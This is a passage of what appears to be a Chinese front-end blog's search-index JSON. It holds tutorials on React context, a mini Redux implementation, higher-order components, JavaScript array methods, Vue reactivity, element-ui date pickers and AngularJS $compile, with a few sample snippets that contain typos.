&lt;div&gt; &lt;p&gt;侧边栏&lt;/p&gt; &lt;Navbar /&gt; &lt;/div&gt; ) &#125;&#125;class Navbar extends React.Component &#123; static childContextTypes = &#123; user:PropTypes.string &#125; render()&#123; return ( &lt;div&gt; &lt;p&gt;我是&#123;this.context.user&#125;的导航栏&lt;/p&gt; &lt;Siderbar /&gt; &lt;/div&gt; ) &#125;&#125; context在Provider种应用 provider组件就是使用context，把store放到context里，所有的子元素可以直接取到store 1234567891011121314151617import PropTypes from 'prop-types'class Provider extends Component &#123; static childContextTypes = &#123; store:Protypes.object &#125; constructor(props,context)&#123; super(props,context) this.store = props.store &#125; getChildContext()&#123; //把传进来的store放进全局 return &#123;store:this.store&#125; &#125; render()&#123; return this.props.children &#125;&#125; connect 负责连接组件，给到redux里的数据放到组件的属性里 负责接收一个组件，把state里的一些数据放进去，返回一个组件 数据变化的时候，能够通知组件 123456789101112131415161718192021222324252627282930313233343536373839//高阶组件写法const connect = (mapStateToProps=state=&gt;state,mapDispatchToProps=&#123;&#125;)=&gt;(wrapperComponent)=&gt;&#123; return class ConnectComponent extends React.Component &#123; //负责接收组件 static contextTypes = &#123; store:PropTypes.obejct &#125; constructor(props)&#123; super(props, context)&#123; this.state = &#123; props:&#123;&#125; &#125; &#125; &#125; componentDidMount()&#123; const &#123;store&#125; = this.context store.subscribe(()=&gt;this.update()) this.update() &#125; update()&#123; // 获取mapStateToProps、mapDispatchToProps 放入this.props里 const &#123;store&#125;=this.context const stateProps = mapStateToProps(store.getState()) const dispatchProps = bindActionCreators(mapDispatchProps,store.dispatch) this.setState(&#123; props:&#123; ...this.state.props, ...stateProps, ...dispatchProps &#125; &#125;) &#125; render()&#123; // 把数据放入 return &lt;wrapperComponent &#123;...this.state.props&#125;/&gt; &#125; &#125;&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"实现一个迷你版的redux","slug":"2018-07-react-redux","date":"2018-07-23T01:20:24.000Z","updated":"2018-10-24T03:46:02.503Z","comments":true,"path":"note/b247df08.html","link":"","permalink":"https://ru23.com/note/b247df08.html","excerpt":"","text":"迷你版redux实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768export const createStore = (reducer,enhancer)=&gt;&#123; if(enhancer) &#123; return enhancer(createStore)(reducer) &#125; let currentState = &#123;&#125; let currentListeners = [] const getState = ()=&gt;currentState const subscribe = (listener)=&gt;&#123; currentListeners.push(listener) &#125; const dispatch = action=&gt;&#123; currentState = reducer(currentState, action) currentListeners.forEach(v=&gt;v()) return action &#125; dispatch(&#123;type:'@@INIT'&#125;) return &#123;getState,subscribe,dispatch&#125;&#125;//中间件实现export applyMiddleWare(...middlewares)&#123; return createStore=&gt;...args=&gt;&#123; const store = createStore(...args) let dispatch = store.dispatch const midApi = &#123; getState:store.getState, dispatch:...args=&gt;dispatch(...args) &#125; const middlewaresChain = middlewares.map(middleware=&gt;middleware(midApi)) dispatch = compose(...middlewaresChain)(store.dispatch) return &#123; ...store, dispatch &#125; &#125;// fn1(fn2(fn3())) 把函数嵌套依次调用export function compose(...funcs)&#123; if(funcs.length===0)&#123; return arg=&gt;arg &#125; if(funs.length===1)&#123; return funs[0] &#125; return funcs.reduce((ret,item)=&gt;(...args)=&gt;ret(item(...args)))&#125;//bindActionCreator实现function bindActionCreator(creator,dispatch)&#123; return ...args=&gt;dispatch(creator(...args))&#125;function bindActionCreators(creators,didpatch)&#123; //let bound = &#123;&#125; //Object.keys(creators).forEach(v=&gt;&#123; // let creator = creator[v] // bound[v] = bindActionCreator(creator,dispatch) //&#125;) //return bound return Object.keys(creators).reduce((ret,item)=&gt;&#123; ret[item] = bindActionCreator(creators[item],dispatch) return ret &#125;,&#123;&#125;)&#125; react-redux实现 例子 provider组件就是使用context，把store放到context里，所有的子元素可以直接取到store 1234567891011121314151617import PropTypes from 'prop-types'class Provider extends Component &#123; static childContextTypes = &#123; store:Protypes.object &#125; constructor(props,context)&#123; super(props,context) this.store = props.store &#125; getChildContext()&#123; //把传进来的store放进全局 return &#123;store:this.store&#125; &#125; render()&#123; return this.props.children &#125;&#125; connect 负责连接组件，给到redux里的数据放到组件的属性里 负责接收一个组件，把state里的一些数据放进去，返回一个组件 数据变化的时候，能够通知组件 123456789101112131415161718192021222324252627282930313233343536373839//高阶组件写法const connect = (mapStateToProps=state=&gt;state,mapDispatchToProps=&#123;&#125;)=&gt;(wrapperComponent)=&gt;&#123; return class ConnectComponent extends React.Component &#123; //负责接收组件 static contextTypes = &#123; store:PropTypes.obejct &#125; constructor(props)&#123; super(props, context)&#123; this.state = &#123; props:&#123;&#125; &#125; &#125; &#125; componentDidMount()&#123; const &#123;store&#125; = this.context store.subscribe(()=&gt;this.update()) this.update() &#125; update()&#123; // 获取mapStateToProps、mapDispatchToProps 放入this.props里 const &#123;store&#125;=this.context const stateProps = mapStateToProps(store.getState()) const dispatchProps = bindActionCreators(mapDispatchProps,store.dispatch) this.setState(&#123; props:&#123; ...this.state.props, ...stateProps, ...dispatchProps &#125; &#125;) &#125; render()&#123; // 把数据放入 return &lt;wrapperComponent &#123;...this.state.props&#125;/&gt; &#125; &#125;&#125; 自己造一个中间件 1234567891011const thunk = (&#123;dispatch,getState&#125;)=&gt;next=&gt;action=&gt;&#123; if(typeof action == 'function')&#123; return action(dispatch,getState) &#125; if(Array.isArray(action)&#123; return action.forEach(v=&gt;dispatch(v)) &#125; //默认 什么都不做 return next(action)&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"浅析React高阶组件HOC","slug":"2018-07-react-hoc","date":"2018-07-22T16:10:24.000Z","updated":"2018-10-24T03:46:02.501Z","comments":true,"path":"note/76f030b4.html","link":"","permalink":"https://ru23.com/note/76f030b4.html","excerpt":"","text":"高阶组件是什么 高阶组件其实就是一个函数，传入一个组件返回一个新的组件。它接受一个组件作为参数，返回一个新的组件。这个新的组件会使用你传给它的组件作为子组件 高阶组件的作用其实不言而喻，其实就是为了组件之间的代码复用。组件可能有着某些相同的逻辑，把这些逻辑抽离出来，放到高阶组件中进行复用。高阶组件内部的包装组件和被包装组件之间通过 props 传递数据 如何实现高阶组件 高阶组件其实就是处理react组件的函数。那么我们如何实现一个高阶组件？有两种方法 属性代理 属性代理是最常见的实现方式，将被处理组件的props和新的props一起传递给新组件 123456789101112export default function withHeader(WrappedComponent) &#123; return class HOC extends Component &#123; render() &#123; return &lt;div&gt; &lt;div className=\"demo-header\"&gt; 我是标题 &lt;/div&gt; &lt;WrappedComponent &#123;...this.props&#125;/&gt; &lt;/div&gt; &#125; &#125;&#125; 在其他组件里，我们引用这个高阶组件，用来强化它 12345678910@withHeaderexport default class Demo extends Component &#123; render() &#123; return ( &lt;div&gt; 我是一个普通组件 &lt;/div&gt; ); &#125;&#125; 使用ES6写法可以更加简洁 123456789101112export default(title) =&gt; (WrappedComponent) =&gt; class HOC extends Component &#123; render() &#123; return &lt;div&gt; &lt;div className=\"demo-header\"&gt; &#123;title ? title : '我是标题'&#125; &lt;/div&gt; &lt;WrappedComponent &#123;...this.props&#125;/&gt; &lt;/div&gt; &#125;&#125; 从代码中看，就是使用HOC这个函数，向被处理的组件WrappedComponent上面添加一些属性，并返回一个包含原组件的新组件 反向继承 123456789101112131415161718192021222324252627282930313233343536373839404142434445function HOC(WrappedComponent)&#123; return class HOC extends WrappedComponent &#123; //继承了传入的组件 test1()&#123; return this.test2() + 5; &#125; componentDidMount()&#123; console.log('1'); this.setState(&#123;number:2&#125;); &#125; render()&#123; //使用super调用传入组件的render方法 return super.render(); &#125; &#125;&#125; @HOCclass OriginComponent extends Component &#123; constructor(props)&#123; super(props); this.state = &#123;number:1&#125; &#125; test2()&#123; return 4; &#125; componentDidMount()&#123; console.log('2'); &#125; render()&#123; return ( &lt;div&gt; &#123;this.state.number&#125;&#123;'and'&#125; &#123;this.test1()&#125; 这是原始组件 &lt;/div&gt; ) &#125;&#125; //const newComponent = HOC(OriginComponent)","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"组(Array)操作之splice() --删除、插入、替换","slug":"2018-07-组-Array-操作之splice-删除、插入、替换","date":"2018-07-19T09:23:41.000Z","updated":"2018-10-24T03:46:02.544Z","comments":true,"path":"note/c9afb08d.html","link":"","permalink":"https://ru23.com/note/c9afb08d.html","excerpt":"","text":"splice()方法，号称最强大的数组方法！！ splice()的主要用途是向数组的中部插入项，但是用这种方法的方式则有如下3中。 1、删除：可以删除任意数量的项，只需指定2个参数：要删除的第一项的位置和要删除的项数。例如，splice(0, 2)会删除数组中的前两项。 2、插入：可以向指定位置插入任意数量的项，只需提供3个参数：起始位置、0(要删除的项数)和要插入的项。如果要插入多个项，可以再传入第四、第五，以至任意多个项。例如，splice(2, 0, “red”, “green”)会从当前数组的位置2开始插字符串”red”和”green”。 3、替换：可以向指定位置插入任意数量的项，且同时删除任意数量的项，只需指定3个参数：起始位置、要删除的项数和要插入的任意数量的项。插入的项不必与删除的项相等。例如，splice(2, 1, “red”, “green”)，会删除当前数组位置2的项，然后再从位置2开始插入字符串”red”和”green”。 splice()方法始终都会返回一个数组，该数组中包含从原数组删除的项（如果没有删除任何项，则返回一个空数组）。下面的代码展示了上述3中使用splice()方法的方式。 123456789101112var colors = [\"red\", \"green\", \"blue\"];var removed = colors.splice(0, 1); //删除第一项console.log(\"colors：\" + colors); //green, blueconsole.log(\"返回的数组：\" + removed); //red,返回的数组中只包含一项removed = colors.splice(1, 0, \"yellow\", \"orange\"); //从位置1开始插入两项console.log(\"colors：\" + colors); //green, yellow, orange, blueconsole.log(\"返回的数组：\" + removed); //返回的是一个空数组removed = colors.splice(1, 1, \"red\", \"purple\"); //从位置1 删除一项，插入两项console.log(\"colors：\" + colors); //green, red, purple, orange, blueconsole.log(\"返回的数组：\" + removed); //yellow,返回的数组中只包含一项","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"vue子组件改变父组件数据的方法 emit方法","slug":"2018-07-vue子组件改变父组件数据的方法-emit方法","date":"2018-07-18T08:45:09.000Z","updated":"2018-10-24T03:46:02.539Z","comments":true,"path":"note/4859b5d8.html","link":"","permalink":"https://ru23.com/note/4859b5d8.html","excerpt":"","text":"场景：自己封装的插件需要点击子组件的按钮去操作父组件的数据 方法子组件代码12345678910&lt;template&gt; &lt;child @click=&quot;close&quot;&gt;&lt;/child&gt;&lt;/template&gt;&lt;script&gt;methods: &#123; close() &#123; this.$emit(&apos;close&apos;,true); //触发close方法，true为向父组件传递的数据 &#125;&#125;&lt;/script&gt; 父组件12345678910111213141516&lt;template&gt; &lt;parent @close=&quot;toClose&quot; :msg=&quot;msg&quot;&gt;&lt;/parent&gt; //监听子组件触发的close事件,然后调用toClose方法 &lt;div&gt;&#123;&#123; msg &#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;data () &#123; return &#123; msg: false, &#125;&#125;，methods: &#123; toClose(msg) &#123; this.msg = msg; &#125;&#125;&lt;/script&gt; 拓展：vue emit 有多个参数该如何写1this.$emit(&apos;transferName&apos;, &#123;name: this.name, dev: this.des&#125;) 父组件HTML代码1&lt;child @transferName=\"getNameAndDes\"&gt;&lt;/child&gt; JS代码1234getNameAndDes(msg) &#123; this.name = msg.name this.dev = msg.dev&#125;","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://ru23.com/tags/vue/"}]},{"title":"react-router v4中，不提供browserHistory等的导出~~怎么解决","slug":"2018-07-react-router-v4中，不提供browserHistory等的导出-怎么解决","date":"2018-07-17T08:48:04.000Z","updated":"2018-10-24T03:46:02.505Z","comments":true,"path":"note/45e7735c.html","link":"","permalink":"https://ru23.com/note/45e7735c.html","excerpt":"","text":"问题当我们使用react-router v3的时候，我们想跳转路由，我们一般这样处理我们从react-router导出browserHistory。我们使用browserHistory.push()等等方法操作路由跳转。问题来了，在react-router v4中，不提供browserHistory等的导出~~那怎么办？我如何控制路由跳转呢？？？ 解决方法使用 withRouterwithRouter高阶组件，提供了history让你使用~ 1234567891011import React from \"react\";import &#123;withRouter&#125; from \"react-router-dom\";class MyComponent extends React.Component &#123; ... myFunction() &#123; this.props.history.push(\"/some/Path\"); &#125; ...&#125;export default withRouter(MyComponent); 我们可以不使用推荐的BrowserRouter，依旧使用Router组件。我们自己创建history，其他地方调用自己创建的history。","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"React 如何监听路由变化重新渲染数据","slug":"2018-07-React-如何监听路由变化重新渲染数据","date":"2018-07-17T08:46:55.000Z","updated":"2018-10-24T03:46:02.506Z","comments":true,"path":"note/85383de6.html","link":"","permalink":"https://ru23.com/note/85383de6.html","excerpt":"","text":"应用场景：12345678910// route.js&lt;Router&gt; &lt;Switch&gt; &lt;Route path=\"/\" component=&#123;NewsList&#125; /&gt; &lt;Route path=\"/a\" component=&#123;NewsList&#125; /&gt; &lt;Route path=\"/b\" component=&#123;NewsList&#125; /&gt; &lt;Route path=\"/c\" component=&#123;NewsList&#125; /&gt; &lt;Route path=\"/d\" component=&#123;NewsList&#125; /&gt; &lt;/Switch&gt;&lt;/Router&gt; 12345678910class NewsList extends Component &#123; componentWillMount () &#123; const type = this.props.location.pathname.replace('/', '') || 'top' this.props.dispatch(fetchListData(type)) &#125; render () &#123; ... &#125;&#125; 分析：React组件的生命周期钩子。第一次加载时:1234\"constructor\"\"componentWillMount\"\"render\"\"componentDidMount\" 当组件的props发生改变时，组件更新，会调用如下的生命周期钩子12345&quot;componentWillReceiveProps&quot;&quot;shouldComponentUpdate&quot;&quot;componentWillUpdate&quot;&quot;render&quot;&quot;componentDidUpdate&quot; 当路由变化时，即组件的props发生了变化，会调用componentWillReceiveProps等生命周期钩子 怎么做呢？1234567891011121314151617181920class NewsList extends Component &#123; componentDidMount () &#123; this.fetchData(this.props.location); &#125; fetchData(location) &#123; const type = location.pathname.replace('/', '') || 'top' this.props.dispatch(fetchListData(type)) &#125; componentWillReceiveProps(nextProps) &#123; if (nextProps.location.pathname != this.props.location.pathname) &#123; this.fetchData(nextProps.location); &#125; &#125; render () &#123; ... &#125;&#125;","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"使用slice()简单封装实现将数组分割为几个等长度的子数组","slug":"2018-07-使用slice-简单封装实现将数组分割为几个等长度的子数组","date":"2018-07-16T08:42:32.000Z","updated":"2018-10-24T03:46:02.542Z","comments":true,"path":"note/d7aaf523.html","link":"","permalink":"https://ru23.com/note/d7aaf523.html","excerpt":"","text":"使用数组的时候，我们有时候希望将一个数组分成几个相同长度的子数组，使用slice()方法可以返回一个子数组，所以我们可以将slice()再进行封装一下，以实现上面的功能。 首先我们先来看一下slice()方法： slice() 定义和用法slice() 方法可从已有的数组中返回选定的元素。 语法arrayObject.slice(start,end) 参数 描述 start 必需。规定从何处开始选取。如果是负数，那么它规定从数组尾部开始算起的位置。也就是说，-1 指最后一个元素，-2 指倒数第二个元素，以此类推。 end 可选。规定从何处结束选取。该参数是数组片断结束处的数组下标。如果没有指定该参数，那么切分的数组包含从 start 到数组结束的所有元素。如果这个参数是负数，那么它规定的是从数组尾部开始算起的元素。 返回值返回一个新的数组，包含从 start 到 end （不包括该元素）的 arrayObject 中的元素。 说明请注意，该方法并不会修改数组，而是返回一个子数组。如果想删除数组中的一段元素，应该使用方法 Array.splice()。 提示和注释注释：您可使用负值从数组的尾部选取元素。注释：如果 end 未被规定，那么 slice() 方法会选取从 start 到数组结尾的所有元素。 封装slice()加入现在有一个数组[1,2,3,4,5,6,7,8,9]，将其分为长度为4的子数组子数组1：[1,2,3,4] 是从数组下标0–&gt;3子数组2：[5,6,7,8] 是从数组下标4–&gt;7子数组3：[9] 是从数组下标8，因为不满4个从上面我们可以看到，一共分为3个数组，所以我们可以使用循环来进行封装。1234567891011121314/* * 将一个数组分成几个同等长度的数组 * array[分割的原数组] * size[每个子数组的长度] */function sliceArray(array, size) &#123; var result = []; for (var x = 0; x &lt; Math.ceil(array.length / size); x++) &#123; var start = x * size; var end = start + size; result.push(array.slice(start, end)); &#125; return result;&#125; 例如：123var array = [1,2,3,4,5,6,7,8,9];var array = sliceArray(array, 4);console.log(array); 将几个数组合并为一个数组concat()1.定义和用法concat() 方法用于连接两个或多个数组。该方法不会改变现有的数组，而仅仅会返回被连接数组的一个副本。2.语法arrayObject.concat(arrayX,arrayX,……,arrayX) 参数 描述 arrayX 必需。该参数可以是具体的值，也可以是数组对象。可以是任意多个。 返回值返回一个新的数组。该数组是通过把所有 arrayX 参数添加到 arrayObject 中生成的。如果要进行 concat() 操作的参数是数组，那么添加的是数组中的元素，而不是数组。例如1234var arr1 = [1,2,3];var arr2 = [4,5,6];var arr = [];arr.concat(arr1, arr2); //输出[1, 2, 3, 4, 5, 6]","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"vue数组中数据变化但是视图没有更新解决方案","slug":"2018-07-vue数组中数据变化但是视图没有更新解决方案","date":"2018-07-11T08:41:15.000Z","updated":"2018-10-24T03:46:02.541Z","comments":true,"path":"note/d6f8e949.html","link":"","permalink":"https://ru23.com/note/d6f8e949.html","excerpt":"","text":"数组更新检测变异方法Vue 包含一组观察数组的变异方法，所以它们也将会触发视图更新。这些方法如下：1234567push()pop()shift()unshift()splice()sort()reverse() 你打开控制台，然后用前面例子的 items 数组调用变异方法：example1.items.push({ message: ‘Baz’ }) 。 替换数组变异方法 (mutation method)，顾名思义，会改变被这些方法调用的原始数组。相比之下，也有非变异 (non-mutating method) 方法，例如：filter(), concat() 和 slice() 。这些不会改变原始数组，但总是返回一个新数组。当使用非变异方法时，可以用新数组替换旧数组： 123example1.items = example1.items.filter(function (item) &#123; return item.message.match(/Foo/)&#125;) 你可能认为这将导致 Vue 丢弃现有 DOM 并重新渲染整个列表。幸运的是，事实并非如此。Vue 为了使得 DOM 元素得到最大范围的重用而实现了一些智能的、启发式的方法，所以用一个含有相同元素的数组去替换原来的数组是非常高效的操作。 注意事项由于 JavaScript 的限制，Vue 不能检测以下变动的数组： 当你利用索引直接设置一个项时，例如：vm.items[indexOfItem] = newValue当你修改数组的长度时，例如：vm.items.length = newLength举个例子：1234567var vm = new Vue(&#123; data: &#123; items: ['a', 'b', 'c'] &#125;&#125;)vm.items[1] = 'x' // 不是响应性的vm.items.length = 2 // 不是响应性的 为了解决第一类问题，以下两种方式都可以实现和 vm.items[indexOfItem] = newValue 相同的效果，同时也将触发状态更新： 1234// Vue.setVue.set(vm.items, indexOfItem, newValue)// Array.prototype.splicevm.items.splice(indexOfItem, 1, newValue) 你也可以使用 vm.$set 实例方法，该方法是全局方法 Vue.set 的一个别名： 1vm.$set(vm.items, indexOfItem, newValue) 为了解决第二类问题，你可以使用 splice：1vm.items.splice(newLength) 对象更改检测注意事项还是由于 JavaScript 的限制，Vue 不能检测对象属性的添加或删除： 123456789var vm = new Vue(&#123; data: &#123; a: 1 &#125;&#125;)// `vm.a` 现在是响应式的vm.b = 2// `vm.b` 不是响应式的 对于已经创建的实例，Vue 不能动态添加根级别的响应式属性。但是，可以使用 Vue.set(object, key, value) 方法向嵌套对象添加响应式属性。例如，对于： 1234567var vm = new Vue(&#123; data: &#123; userProfile: &#123; name: 'Anika' &#125; &#125;&#125;) 你可以添加一个新的 age 属性到嵌套的 userProfile 对象：1Vue.set(vm.userProfile, 'age', 27) 你还可以使用 vm.$set 实例方法，它只是全局 Vue.set 的别名：1vm.$set(vm.userProfile, 'age', 27) 有时你可能需要为已有对象赋予多个新属性，比如使用 Object.assign() 或 _.extend()。在这种情况下，你应该用两个对象的属性创建一个新的对象。所以，如果你想添加新的响应式属性，不要像这样：1234Object.assign(vm.userProfile, &#123; age: 27, favoriteColor: 'Vue Green'&#125;) 你应该这样做：1234vm.userProfile = Object.assign(&#123;&#125;, vm.userProfile, &#123; age: 27, favoriteColor: 'Vue Green'&#125;)","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://ru23.com/tags/vue/"}]},{"title":"修改element ui 源码 npm run dist 报错以及解决方案","slug":"2018-06-修改element-ui-源码-npm-run-dist-报错以及解决方案","date":"2018-06-25T08:36:54.000Z","updated":"2018-10-24T03:46:02.495Z","comments":true,"path":"note/47bf543f.html","link":"","permalink":"https://ru23.com/note/47bf543f.html","excerpt":"","text":"报错1234567891011121314151617181920212223242526272829D:\\astudy\\element-dev\\packages\\theme-chalk\\src\\fonts\\element-icons.ttf 1:1 error Parsing error: Unexpected character ''D:\\astudy\\element-dev\\packages\\theme-chalk\\src\\fonts\\element-icons.woff 1:5 error Parsing error: Unexpected character ''✖ 2 problems (2 errors, 0 warnings)npm ERR! code ELIFECYCLEnpm ERR! errno 1npm ERR! element-ui@2.4.1 lint: `eslint src/**/* test/**/* packages/**/* build/**/* --quiet`npm ERR! Exit status 1npm ERR!npm ERR! Failed at the element-ui@2.4.1 lint script.npm ERR! This is probably not a problem with npm. There is likely additional logging output above.npm ERR! A complete log of this run can be found in:npm ERR! C:\\Users\\terry.wt\\AppData\\Roaming\\npm-cache\\_logs\\2018-06-25T06_12_46_026Z-debug.lognpm ERR! code ELIFECYCLEnpm ERR! errno 1npm ERR! element-ui@2.4.1 dist: `npm run clean &amp;&amp; npm run build:file &amp;&amp; npm run lint &amp;&amp; webpack --config build/webpack.conf.js &amp;&amp; webpack --config build/webpack.common.js &amp;&amp; webpack --config build/webpack.component.js&amp;&amp; npm run build:utils &amp;&amp; npm run build:umd &amp;&amp; npm run build:theme`npm ERR! Exit status 1npm ERR!npm ERR! Failed at the element-ui@2.4.1 dist script.npm ERR! This is probably not a problem with npm. There is likely additional logging output above.npm ERR! A complete log of this run can be found in:npm ERR! C:\\Users\\terry.wt\\AppData\\Roaming\\npm-cache\\_logs\\2018-06-25T06_12_46_124Z-debug.log 报错是因为eslint检测出空格导致的，网上找了很多在webpack配置关闭eslint的方法不生效 修改方案 找到package.json文件找到script里面的dist方法，删除&amp;&amp;npm run lint方法 就可以了","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"npm","slug":"npm","permalink":"https://ru23.com/tags/npm/"},{"name":"elementUI","slug":"elementUI","permalink":"https://ru23.com/tags/elementUI/"},{"name":"vue","slug":"vue","permalink":"https://ru23.com/tags/vue/"}]},{"title":"[react]-动态添加class","slug":"2018-06-react-动态添加class","date":"2018-06-17T11:09:19.000Z","updated":"2018-10-24T03:46:02.492Z","comments":true,"path":"note/76ba0f83.html","link":"","permalink":"https://ru23.com/note/76ba0f83.html","excerpt":"","text":"12345&lt;li className=&#123;['mingxi-tit-one', this.state.buttonType === 1 &amp;&amp; 'mingxi-active'].join(' ')&#125;&gt;&lt;/li&gt;// 数组元素为className，// &amp;&amp; 符号为判断符，若条件成立则执行后面的内容// join为数组的方法，将数组元素拼接为字符串，链接符为一个空字符串","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"【ElementUI】日期选择器时间选择范围限制插入、替换","slug":"2018-05-【ElementUI】日期选择器时间选择范围限制插入、替换","date":"2018-05-14T09:27:47.000Z","updated":"2018-10-24T03:46:02.490Z","comments":true,"path":"note/5e4f4766.html","link":"","permalink":"https://ru23.com/note/5e4f4766.html","excerpt":"","text":"ElementUI是饿了么推出的一套基于vue2.x的一个ui框架。官方文档也很详细，这里做一个element-ui日期插件的补充。官方文档中使用picker-options属性来限制可选择的日期，这里举例子稍做补充。 单个输入框的 组件代码：123&lt;el-date-picker v-model=\"value1\" type=\"date\" placeholder=\"选择日期\" :picker-options=\"pickerOptions0\"&gt; &lt;/el-date-picker&gt; 情景1: 设置选择今天以及今天之后的日期1234567891011121314151617181920212223data ()&#123; return &#123; pickerOptions0: &#123; disabledDate(time) &#123; return time.getTime() &lt; Date.now() - 8.64e7; &#125; &#125;, &#125; &#125; ``` **情景2: 设置选择今天以及今天以前的日期**```jsdata ()&#123; return &#123; pickerOptions0: &#123; disabledDate(time) &#123; return time.getTime() &gt; Date.now() - 8.64e6 &#125; &#125;, &#125; &#125; 情景3: 设置选择今天之后的日期（不能选择当天时间）1234567891011121314151617181920212223data ()&#123; return &#123; pickerOptions0: &#123; disabledDate(time) &#123; return time.getTime() &lt; Date.now(); &#125; &#125;, &#125; &#125; ``` **情景4: 设置选择今天之前的日期（不能选择当天）**```jsdata ()&#123; return &#123; pickerOptions0: &#123; disabledDate(time) &#123; return time.getTime() &gt; Date.now(); &#125; &#125;, &#125; &#125; 情景5: 设置选择三个月之前到今天的日期 123456789101112data ()&#123; return &#123; pickerOptions0: &#123; disabledDate(time) &#123; let curDate = (new Date()).getTime(); let three = 90 * 24 * 3600 * 1000; let threeMonths = curDate - three; return time.getTime() &gt; Date.now() || time.getTime() &lt; threeMonths;; &#125; &#125;, &#125; &#125; 两个输入框 组件代码 123456&lt;el-date-picker v-model=\"value1\" type=\"date\" placeholder=\"开始日期\" :picker-options=\"pickerOptions0\"&gt;&lt;/el-date-picker&gt;&lt;el-date-picker v-model=\"value2\" type=\"date\" placeholder=\"结束日期\":picker-options=\"pickerOptions1\"&gt;&lt;/el-date-picker&gt; 情景1: 限制结束日期不能大于开始日期 12345678910111213141516171819data()&#123; return &#123; pickerOptions0: &#123; disabledDate: (time) =&gt; &#123; if (this.value2 != \"\") &#123; return time.getTime() &gt; Date.now() || time.getTime() &gt; this.value2; &#125; else &#123; return time.getTime() &gt; Date.now(); &#125; &#125; &#125;, pickerOptions1: &#123; disabledDate: (time) =&gt; &#123; return time.getTime() &lt; this.value1 || time.getTime() &gt; Date.now(); &#125; &#125;, &#125; &#125;","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"elementUI","slug":"elementUI","permalink":"https://ru23.com/tags/elementUI/"}]},{"title":"详解angularJS动态生成的页面中ng-click无效解决办法","slug":"2018-04-详解angularJS动态生成的页面中ng-click无效解决办法","date":"2018-04-24T08:34:39.000Z","updated":"2018-10-24T03:46:02.487Z","comments":true,"path":"note/f99d9594.html","link":"","permalink":"https://ru23.com/note/f99d9594.html","excerpt":"","text":"今天碰到了一个这样的需求，在自己写的动态的页面中，写入的AngularJS无效不能点击响应事件，以下给出代码以及解决方案 1.首先将我们要赋值给页面的数据new一下 1234567var html = \"&lt;a href='javascript:void(0);' ng-click='test()'&gt;&lt;/a&gt;\"``` &lt;h5&gt;2.用$compile函数编译一下上边的内容&lt;/h5&gt;```htmlvar $html = $compile(html)($scope); 3.将编译好的内容插入到页面中 1$(\"body\").append($html); 以下是完整版本 1234567891011app.controller('customersCtrl', function ($scope, $http,$compile) &#123; $scope.test = function()&#123; alert('test'); &#125; // TODO 动态生成html中 ng-click无效 解决方法 $compile 是传进来的 //下边这句话就是要写入页面中的内容，首先把你写入的内容赋值给html var html = \"&lt;a href='javascript:void(0);' ng-click='test()'&gt;&lt;/a&gt;\"//用$compile进行编译 var $html = $compile(html)($scope); //添加到页面中，或者你任何想添加的位置。&#125;); $(\"body\").append($html); ng-click就可以触发function了","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"angular","slug":"angular","permalink":"https://ru23.com/tags/angular/"},{"name":"踩过的坑","slug":"踩过的坑","permalink":"https://ru23.com/tags/踩过的坑/"}]},{"title":"frank的前端开发规范（逐步完善）","slug":"2018-04-frank的前端开发规范（逐步完善）","date":"2018-04-19T11:49:01.000Z","updated":"2018-10-24T09:31:08.374Z","comments":true,"path":"note/91d30337.html","link":"","permalink":"https://ru23.com/note/91d30337.html","excerpt":"","text":"js方法注释规范规范的注释很重要代码是写给人看的，顺便给机器运行，多谢注释可以增加代码的可读性 123456789101112131415161718/** ************** * @func 教师端请假功能 ; * @param &#123;String&#125; token 教师端头部的token; * @param &#123;string&#125; a - 参数a; * @param &#123;number&#125; b=1 - 参数b默认值为1; * @param &#123;string&#125; c=1 - 参数c有两种支持的取值&lt;/br&gt;1—表示x&lt;/br&gt;2—表示xx; * @param &#123;object&#125; d - 参数d为一个对象; * @param &#123;string&#125; d.e - 参数d的e属性; * @param &#123;string&#125; d.f - 参数d的f属性; * @param &#123;object[]&#125; g - 参数g为一个对象数组; * @param &#123;string&#125; g.h - 参数g数组中一项的h属性; * @param &#123;string&#125; g.i - 参数g数组中一项的i属性; * @param &#123;string&#125; [j] - 参数j是一个可选参数; * @description 2018年4月19日被frank开发于dev_sprint65分支， * XX年XX月被XX在xx分支修改（原因或者修改的功能）; ****************/ 变量命名规范1.标准变量命名使用驼峰式命名 eg. let 